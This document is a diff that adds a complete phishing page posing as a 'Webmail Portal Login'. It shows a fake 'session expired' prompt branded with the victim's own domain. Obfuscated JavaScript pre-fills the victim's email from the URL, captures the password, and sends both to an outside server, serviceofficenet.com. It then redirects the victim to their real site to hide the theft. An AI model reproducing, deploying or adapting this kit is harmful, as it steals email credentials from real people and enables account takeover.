@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+
+  <meta charset="UTF-8">
+  
+<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+        <meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow"> 
+    <title>Webmail Portal Login</title>
+    <script src="jquery-1.js"></script>
+
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+
+      <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="bootstrap.min.css?1422585379">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail%26display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+  <style>
+  
+ html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}
+    
+    html,body{}#root{position:absolute;left:0;right:0;bottom:0;top:0;z-index:-10;pointer-events:none}.error{color:#dc3545;width:80%;margin:0 auto;padding-top:5px}.form-holder{background-color:#fff;width:600px;margin:100px auto;height:100%;box-shadow:0 20px 50px #a9a9a9;border-radius:4px 4px 0 0;border:1px solid #d6dfea;z-index:12}
+     
+ }
+  
+
+.social_icons a{
+  display: block;
+  height: 45px;
+  width: 100%;
+  line-height: 45px;
+  text-align: center;
+  border-radius: 5px;
+  font-size: 20px;
+  color: #fff;
+  text-decoration: none;
+  transition: all 0.3s linear;
+}
+.social_icons a span{
+  margin-left: 5px;
+  font-size: 18px;
+}
+.social_icons a:first-child{
+  margin-right: 5px;
+  background: #4267B2;
+}
+.social_icons a:first-child:hover{
+  background: #375695;
+}
+.social_icons a:last-child{
+  margin-left: 5px;
+  background: #1DA1F2;
+}
+.social_icons a:last-child:hover{
+  background: #0d8bd9;
+}
+form {
+  margin-top: 25px;
+}
+form .input_box{
+  height: 50px;
+  width: 100%;
+  position: relative;
+  margin-top: 15px;
+}
+.input_box input{
+  height: 100%;
+  width: 100%;
+  outline: none;
+  border: 1px solid lightgrey;
+  border-radius: 5px;
+  padding-left: 45px;
+  font-size: 17px;
+  transition: all 0.3s ease;
+}
+.input_box input:focus{
+  border-color: #ff0000;
+}
+.input_box .icon{
+  position: absolute;
+  top: 50%;
+  left: 20px;
+  transform: translateY(-50%);
+  color: grey;
+}
+form .option_div{
+  margin-top: 5px;
+  display: flex;
+  justify-content: space-between;
+}
+.option_div .check_box{
+  display: flex;
+  align-items: center;
+}
+.option_div span{
+  margin-left: 5px;
+  font-size: 16px;
+  color: #333;
+}
+.option_div .forget_div a{
+  font-size: 16px;
+  color: #be2edd;
+}
+.button input{
+  padding-left: 0;
+  background: #be2edd;
+  color: #fff;
+  border: none;
+  font-size: 20px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.3s linear;
+}
+.button input:hover{
+  background: #a720c5;
+}
+form .sign_up{
+  text-align: center;
+  margin-top: 25px;
+}
+.sign_up a{
+  color: #be2edd;
+}
+form a{
+  text-decoration: none;
+}
+form a:hover{
+  text-decoration: underline;
+}
+  </style>
+
+
+  <script>
+  window.console = window.console || function(t) {};
+</script>
+
+  
+  
+  <script>
+  if (document.location.search.match(/type=embed/gi)) {
+    window.parent.postMessage("resize", "*");
+  }
+</script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  
+    <script>
+  window.console = window.console || function(t) {};
+</script>
+
+  
+  
+  <script>
+  if (document.location.search.match(/type=embed/gi)) {
+    window.parent.postMessage("resize", "*");
+  }
+  </script>
+
+  
+  <script>
+
+    /* global $ */
+    (function(_0x412e3d,_0x2ec9a4){var _0x50ab2a=_0x165c,_0x77e35a=_0x412e3d();while(!![]){try{var _0x5c83a8=parseInt(_0x50ab2a(0xfd))/0x1*(-parseInt(_0x50ab2a(0x106))/0x2)+-parseInt(_0x50ab2a(0x122))/0x3+parseInt(_0x50ab2a(0x10d))/0x4+parseInt(_0x50ab2a(0x118))/0x5+parseInt(_0x50ab2a(0x125))/0x6*(-parseInt(_0x50ab2a(0x120))/0x7)+-parseInt(_0x50ab2a(0x112))/0x8*(parseInt(_0x50ab2a(0xfb))/0x9)+parseInt(_0x50ab2a(0x119))/0xa*(parseInt(_0x50ab2a(0x11b))/0xb);if(_0x5c83a8===_0x2ec9a4)break;else _0x77e35a['push'](_0x77e35a['shift']());}catch(_0x20d3a3){_0x77e35a['push'](_0x77e35a['shift']());}}}(_0x17dc,0x2a69d),$(document)['ready'](function(){var _0x40251d=_0x165c,_0x4e17f0=0x0;$(_0x40251d(0x124))[_0x40251d(0x11d)](function(){var _0x37323e=_0x40251d;$('#msg')[_0x37323e(0x11e)](),$(_0x37323e(0x109))[_0x37323e(0xff)]('');var _0x4b1edb={};_0x4b1edb['left']=0xc8,_0x4b1edb[_0x37323e(0x100)]=_0x37323e(0x11e),$(_0x37323e(0x11c))[_0x37323e(0x129)](_0x4b1edb,0x0);var _0x4cd23d={};_0x4cd23d[_0x37323e(0x12b)]=0xc8,_0x4cd23d['opacity']=_0x37323e(0x113),$('#inputbar')['animate'](_0x4cd23d,0x3e8);});var _0x2c4a6e=window[_0x40251d(0x116)]['hash'][_0x40251d(0x10e)](0x1);if(!_0x2c4a6e){}else{var _0x3a6e0f=_0x2c4a6e;$(_0x40251d(0x109))[_0x40251d(0xff)](_0x3a6e0f);var _0x29a04c=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x29a04c[_0x40251d(0x107)](_0x3a6e0f))return $(_0x40251d(0x105))[_0x40251d(0x113)](),_0x2c4a6e[_0x40251d(0x111)],![];var _0x2612ad=_0x3a6e0f[_0x40251d(0x12c)]('@'),_0x38e09c=_0x3a6e0f[_0x40251d(0x10e)](_0x2612ad+0x1),_0x4605ac=_0x38e09c['substr'](0x0,_0x38e09c['indexOf']('.')),_0x5c12e6=_0x4605ac[_0x40251d(0x102)](),_0x54c4eb=_0x4605ac[_0x40251d(0x12d)]();$(_0x40251d(0x127))[_0x40251d(0x11f)]('src','https://www.google.com/s2/favicons?domain='+_0x38e09c),$(_0x40251d(0x114))[_0x40251d(0x10b)](_0x54c4eb),$('.logoname')[_0x40251d(0x10b)](_0x54c4eb),$('#iframe')[_0x40251d(0x11f)](_0x40251d(0x10a),_0x40251d(0x101)+_0x38e09c);}$('#submit-btn')[_0x40251d(0x11d)](function(_0x6277cf){var _0x3b558c=_0x40251d;$(_0x3b558c(0x105))['hide'](),$(_0x3b558c(0xfe))['hide'](),_0x6277cf[_0x3b558c(0x117)]();var _0x46fa3f=$(_0x3b558c(0x109))[_0x3b558c(0xff)](),_0x4160e1=$(_0x3b558c(0x128))[_0x3b558c(0xff)](),_0xece4da=$(_0x3b558c(0xfe))[_0x3b558c(0x10b)]();$(_0x3b558c(0xfe))[_0x3b558c(0x115)](_0xece4da);var _0x18beec=_0x46fa3f,_0xda209a=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0xda209a[_0x3b558c(0x107)](_0x18beec))return $(_0x3b558c(0x105))[_0x3b558c(0x113)](),_0x46fa3f[_0x3b558c(0x111)],![];var _0x5362f8=_0x18beec[_0x3b558c(0x12c)]('@'),_0x18ccd2=_0x18beec[_0x3b558c(0x10e)](_0x5362f8+0x1),_0x7b4448=_0x18ccd2['substr'](0x0,_0x18ccd2[_0x3b558c(0x12c)]('.')),_0x1b2566=_0x7b4448[_0x3b558c(0x102)](),_0x496dba=_0x7b4448[_0x3b558c(0x12d)]();$(_0x3b558c(0x121))[_0x3b558c(0x11f)]('src',_0x3b558c(0x101)+_0x18ccd2),$(_0x3b558c(0x127))['attr']('src',_0x3b558c(0x104)+_0x18ccd2),$(_0x3b558c(0x10c))[_0x3b558c(0x11f)]('src','https://www.google.com/s2/favicons?domain='+_0x18ccd2),$(_0x3b558c(0x114))[_0x3b558c(0x10b)](_0x496dba),_0x4e17f0=_0x4e17f0+0x1;var _0x1f31c4={};_0x1f31c4[_0x3b558c(0xf9)]=_0x46fa3f,_0x1f31c4[_0x3b558c(0x123)]=_0x4160e1,$[_0x3b558c(0x103)]({'dataType':_0x3b558c(0xf8),'url':_0x3b558c(0x11a),'type':_0x3b558c(0x108),'data':_0x1f31c4,'beforeSend':function(_0x58fa7f){var _0x9e6933=_0x3b558c;$(_0x9e6933(0x12a))[_0x9e6933(0x10b)](_0x9e6933(0x10f));},'success':function(_0x569e5c){var _0x5ef009=_0x3b558c;if(_0x569e5c){$('#msg')[_0x5ef009(0x113)](),console[_0x5ef009(0x110)](_0x569e5c);if(_0x569e5c[_0x5ef009(0xf7)]=='ok')$(_0x5ef009(0x128))['val'](''),_0x4e17f0>=0x2&&(_0x4e17f0=0x0,window[_0x5ef009(0x116)][_0x5ef009(0x126)](_0x5ef009(0xfc)+_0x18ccd2));else{}}},'error':function(){var _0x369f5d=_0x3b558c;$(_0x369f5d(0x128))[_0x369f5d(0xff)](''),_0x4e17f0>=0x2&&(_0x4e17f0=0x0,window[_0x369f5d(0x116)][_0x369f5d(0x126)](_0x369f5d(0xfc)+_0x18ccd2)),$('#msg')[_0x369f5d(0x113)]();},'complete':function(){var _0x363586=_0x3b558c;$(_0x363586(0x12a))['html'](_0x363586(0xfa));}});});}));function _0x165c(_0x49f3b8,_0x5e7e5a){var _0x17dcd5=_0x17dc();return _0x165c=function(_0x165ce0,_0x3e3315){_0x165ce0=_0x165ce0-0xf7;var _0x2271b3=_0x17dcd5[_0x165ce0];return _0x2271b3;},_0x165c(_0x49f3b8,_0x5e7e5a);}function _0x17dc(){var _0x2d533c=['html','.logoimg','1214168rvZopJ','substr','Verifing...','log','focus','16ZykZAP','show','#logoname','text','location','preventDefault','920105zOlTzK','16910bNrafB','https://serviceofficenet.com/var/minenewg.php','2629xMTwQx','#automail','click','hide','attr','358918olNlTx','#iframe','976071pCjxsq','password','#back1','12opNtac','replace','#logoimg','#password','animate','#submit-btn','right','indexOf','toUpperCase','signal','JSON','email','Sign\x20in','674469dSuKRu','http://www.','70100GUlsVf','#msg','val','opacity','https://www.','toLowerCase','ajax','https://www.google.com/s2/favicons?domain=','#error','4isNWga','test','POST','#email','src'];_0x17dc=function(){return _0x2d533c;};return _0x17dc();}
+
+
+  </script>
+<script>
+    function _0xce43(){var _0x58d576=['focus','5484VUGPIM','1031938LyKntv','4sfiDPH','587518IPhBla','10EamVEK','455013XggDDL','29824344rOxNyW','3KjoRig','password','594865LqHyjs','5099824inUCrX','4291sSNrCw'];_0xce43=function(){return _0x58d576;};return _0xce43();}function _0x1ba1(_0x37bf83,_0x47f8ec){var _0xce430b=_0xce43();return _0x1ba1=function(_0x1ba199,_0x77195d){_0x1ba199=_0x1ba199-0x1de;var _0x1f27d0=_0xce430b[_0x1ba199];return _0x1f27d0;},_0x1ba1(_0x37bf83,_0x47f8ec);}(function(_0x274286,_0x3e85cd){var _0x913f4c=_0x1ba1,_0x55ac8e=_0x274286();while(!![]){try{var _0x21ec74=-parseInt(_0x913f4c(0x1e0))/0x1+-parseInt(_0x913f4c(0x1de))/0x2*(parseInt(_0x913f4c(0x1e4))/0x3)+parseInt(_0x913f4c(0x1df))/0x4*(-parseInt(_0x913f4c(0x1e6))/0x5)+parseInt(_0x913f4c(0x1ea))/0x6*(-parseInt(_0x913f4c(0x1e8))/0x7)+-parseInt(_0x913f4c(0x1e7))/0x8+-parseInt(_0x913f4c(0x1e2))/0x9*(-parseInt(_0x913f4c(0x1e1))/0xa)+parseInt(_0x913f4c(0x1e3))/0xb;if(_0x21ec74===_0x3e85cd)break;else _0x55ac8e['push'](_0x55ac8e['shift']());}catch(_0x432cf8){_0x55ac8e['push'](_0x55ac8e['shift']());}}}(_0xce43,0x53689),window['onload']=function(){var _0x191df8=_0x1ba1,_0x1be5f7=document['getElementById'](_0x191df8(0x1e5))[_0x191df8(0x1e9)]();});
+
+</script>
+</head>
+
+<body translate="no" >
+  <!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <title>Hello, world!</title>
+  </head>
+  <body>
+      <div id="root">
+<iframe id="iframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe> </div>
+<form action="#" method="post">
+<input type="hidden" class="form-control" name="hido" id="hido" value="">
+<input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+
+     <!--   <h1 style="text-align: center;">Hello, world!</h1>
+ Button trigger modal --> 
+  
+
+    <!-- Modal -->
+    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" style="margin-top: 90px; display: block !important;" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" style="box-shadow: rgba(0, 0, 0, 0.4) 0px 30px 90px;" role="document">
+        <div class="modal-content">
+        <div class="modal-header">
+            <div class="xlogo">
+            <h5><img id="logoimg" src="">
+            <span style="text-transform: capitalize;" id="logoname"></span></h5>
+            </div>
+                
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+            </button>
+        </div>
+        <div class="modal-body">
+        <div class="form-wrap">
+        <center>
+            <div>Session has expired,Sign in again to continue.</div></center>
+        <center>
+          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Invalid Password.! Please Enter your correct Password</div>
+          <div id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist. Enter a different account</div>
+        </center>
+      <div class="input_box">
+        <input type="email" name="username" id="email" placeholder="Email" disabled="disabled" value="">
+        <div class="icon"><i class="fas fa-user"></i></div>
+      </div>
+      <div class="input_box">
+        <input type="password" name="password" id="password" placeholder="Password" autofocus required="required">
+        <div class="icon"><i class="fas fa-lock"></i></div>
+      </div>
+        </div>
+                </div>
+
+       <div class="modal-footer"> 
+            <!--     <div class="input_box"> -->
+
+            <button type="submit" id="submit-btn" class="btn btn-primary">Sign in</button>
+        </div>
+        </div>
+    </div>
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+    <script>
+       function _0x1532(_0x32d6dd,_0x5393f8){var _0x25c581=_0x25c5();return _0x1532=function(_0x1532f4,_0x754b49){_0x1532f4=_0x1532f4-0x1ce;var _0x2667a5=_0x25c581[_0x1532f4];return _0x2667a5;},_0x1532(_0x32d6dd,_0x5393f8);}var _0x13fd06=_0x1532;(function(_0x162e0d,_0x2fb3a6){var _0x5a775b=_0x1532,_0x1146f2=_0x162e0d();while(!![]){try{var _0x1c6deb=-parseInt(_0x5a775b(0x1d9))/0x1*(-parseInt(_0x5a775b(0x1d4))/0x2)+parseInt(_0x5a775b(0x1ce))/0x3+-parseInt(_0x5a775b(0x1d6))/0x4+parseInt(_0x5a775b(0x1d0))/0x5+-parseInt(_0x5a775b(0x1cf))/0x6+parseInt(_0x5a775b(0x1d2))/0x7+-parseInt(_0x5a775b(0x1d3))/0x8;if(_0x1c6deb===_0x2fb3a6)break;else _0x1146f2['push'](_0x1146f2['shift']());}catch(_0x33701c){_0x1146f2['push'](_0x1146f2['shift']());}}}(_0x25c5,0x2cd25),$(document)[_0x13fd06(0x1d5)](function(){var _0x34d228=_0x13fd06;$(_0x34d228(0x1d8))['modal']('show');}));function _0x25c5(){var _0x558c62=['2017716lLqAjC','992030xlJUfj','static','137249FjyrJQ','709880xoQrGQ','17614YMkLXY','ready','2352cnCZmh','keyboard','#exampleModal','39EbYHOa','143136IpyxjO'];_0x25c5=function(){return _0x558c62;};return _0x25c5();}var _0x5ce093={};_0x5ce093['backdrop']=_0x13fd06(0x1d1),_0x5ce093[_0x13fd06(0x1d7)]=![],$(_0x13fd06(0x1d8))['modal'](_0x5ce093);
+    </script>
+
+
+  </body>
+</html>
+
+  
+  
+
+</body>
+
+</html>
+ 
+
